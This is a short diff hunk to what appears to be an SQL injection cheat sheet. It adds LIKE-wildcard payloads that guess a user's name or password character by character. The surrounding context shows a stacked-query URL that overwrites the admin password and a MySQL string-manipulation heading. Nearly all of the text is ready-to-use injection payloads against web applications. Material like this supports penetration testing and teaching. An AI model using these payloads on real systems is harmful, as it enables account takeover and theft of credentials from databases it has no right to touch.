@@ -420,6 +420,12 @@ http://www.sqlinjection.net/union
     ns.agency/stuff.php?id=0'; update users set password="1234" where username="admin";-- 
 ```
 
+**LIKE %_ (sql wildcard matching)**
+```sql
+[where id=']' or user like 'a%   -- matching a user that starts with 'a'
+[where id=']' or password like '1%   -- matching a password that starts with '1'
+```
+
 **MySQL String Manipulation Trickery:**
 ```
 Mid(version(),1,1)
